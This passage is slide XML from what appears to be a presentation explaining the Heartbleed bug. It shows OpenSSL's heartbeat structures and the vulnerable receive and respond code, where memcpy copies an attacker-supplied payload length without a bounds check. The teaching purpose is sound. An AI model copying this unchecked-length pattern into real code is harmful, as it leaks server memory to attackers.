              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>HeartbeatMessageType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> type;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  	uint16 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>payload_length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>; //16 bits -&gt; number of bytes for payload</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  	opaque payload[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>HeartbeatMessage.payload_length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  	opaque padding[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>padding_length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>]; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>} </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>HeartbeatMessage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2700148" y="4262427"/>
            <a:ext cx="6038336" cy="2031325"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>struct</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ssl3_record_st</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>{</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  unsigned </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>int</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> length;    /* How many bytes available */</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0"/>
              <a:t>  [...]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0" err="1"/>
              <a:t>unsigned</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0"/>
              <a:t> char *data;    /* pointer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0" err="1"/>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0" err="1"/>
              <a:t>record</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0"/>
              <a:t> data */</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0"/>
              <a:t>  [...]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="pt-BR" dirty="0"/>
              <a:t>} SSL3_RECORD;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41691012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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Receive the heartbeat message</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	/* Read type and payload length first */</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0" err="1"/>
              <a:t>hbtype</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t> = *p++;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t>	n2s(p, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0" err="1"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="nl-NL" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" dirty="0" err="1"/>
              <a:t>pl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" dirty="0"/>
              <a:t> = p;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8610995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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Send back the received message</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/* Enter response type, length and copy payload */</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>++ = TLS1_HB_RESPONSE;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	s2n(payload, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>memcpy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>pl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, payload);</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="288453181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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Receive</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0" err="1"/>
              <a:t>hbtype</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t> = *p++;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t>	n2s(p, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0" err="1"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="nl-NL" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" dirty="0" err="1"/>
              <a:t>pl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" dirty="0"/>
              <a:t> = p;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Respond</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>++ = TLS1_HB_RESPONSE;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	s2n(payload, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>memcpy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>pl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, payload);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="3920829"/>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Type</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="4473595"/>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Len</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="5025825"/>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payload</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="3893217"/>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Type</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4656493"/>
            <a:ext cx="358917" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>pl</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="13" name="Straight Arrow Connector 12"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5025825"/>
            <a:ext cx="93709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Curved Connector 14"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="8" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="2457267" y="3064874"/>
            <a:ext cx="138047" cy="1684836"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector4">
            <a:avLst>
              <a:gd name="adj1" fmla="val -165596"/>
              <a:gd name="adj2" fmla="val 58194"/>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591517" y="4445983"/>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Len</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Freeform 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5991313" y="2926816"/>
            <a:ext cx="1585462" cy="1808552"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 1585462"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 1808552"/>
              <a:gd name="connsiteX1" fmla="*/ 1573755 w 1585462"/>
              <a:gd name="connsiteY1" fmla="*/ 1394380 h 1808552"/>
              <a:gd name="connsiteX2" fmla="*/ 759268 w 1585462"/>
              <a:gd name="connsiteY2" fmla="*/ 1808552 h 1808552"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="connsiteX0" y="connsiteY0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX1" y="connsiteY1"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX2" y="connsiteY2"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="1585462" h="1808552">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="723605" y="546477"/>
                  <a:pt x="1447210" y="1092955"/>
                  <a:pt x="1573755" y="1394380"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="1700300" y="1695805"/>
                  <a:pt x="759268" y="1808552"/>
                  <a:pt x="759268" y="1808552"/>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0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2498681" y="2250085"/>
            <a:ext cx="3202730" cy="511062"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 3202730"/>
              <a:gd name="connsiteY0" fmla="*/ 511062 h 511062"/>
              <a:gd name="connsiteX1" fmla="*/ 1256243 w 3202730"/>
              <a:gd name="connsiteY1" fmla="*/ 250 h 511062"/>
              <a:gd name="connsiteX2" fmla="*/ 3202730 w 3202730"/>
              <a:gd name="connsiteY2" fmla="*/ 442034 h 511062"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="connsiteX0" y="connsiteY0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX1" y="connsiteY1"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX2" y="connsiteY2"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3202730" h="511062">
                <a:moveTo>
                  <a:pt x="0" y="511062"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="361227" y="261408"/>
                  <a:pt x="722455" y="11755"/>
                  <a:pt x="1256243" y="250"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="1790031" y="-11255"/>
                  <a:pt x="2880616" y="377607"/>
                  <a:pt x="3202730" y="442034"/>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Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="5012019"/>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payload</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Freeform 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2595314" y="4770294"/>
            <a:ext cx="3202730" cy="511062"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 3202730"/>
              <a:gd name="connsiteY0" fmla="*/ 511062 h 511062"/>
              <a:gd name="connsiteX1" fmla="*/ 1256243 w 3202730"/>
              <a:gd name="connsiteY1" fmla="*/ 250 h 511062"/>
              <a:gd name="connsiteX2" fmla="*/ 3202730 w 3202730"/>
              <a:gd name="connsiteY2" fmla="*/ 442034 h 511062"/>
            </a:gdLst>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="connsiteX0" y="connsiteY0"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX1" y="connsiteY1"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="connsiteX2" y="connsiteY2"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3202730" h="511062">
                <a:moveTo>
                  <a:pt x="0" y="511062"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="361227" y="261408"/>
                  <a:pt x="722455" y="11755"/>
                  <a:pt x="1256243" y="250"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="1790031" y="-11255"/>
                  <a:pt x="2880616" y="377607"/>
                  <a:pt x="3202730" y="442034"/>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Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="5592398"/>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s-IS" dirty="0"/>
              <a:t>…...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Rectangle 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="5592398"/>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s-IS" dirty="0"/>
              <a:t>…...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1394291" y="6144628"/>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s-IS" dirty="0"/>
              <a:t>…...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Rectangle 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5591517" y="6167581"/>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s-IS" dirty="0"/>
              <a:t>…...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9360408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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Receive</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0" err="1"/>
              <a:t>hbtype</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t> = *p++;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t>	n2s(p, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0" err="1"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="de-DE" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="nl-NL" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" dirty="0" err="1"/>
              <a:t>pl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="nl-NL" dirty="0"/>
              <a:t> = p;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Respond</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Content Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>++ = TLS1_HB_RESPONSE;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	s2n(payload, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>memcpy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
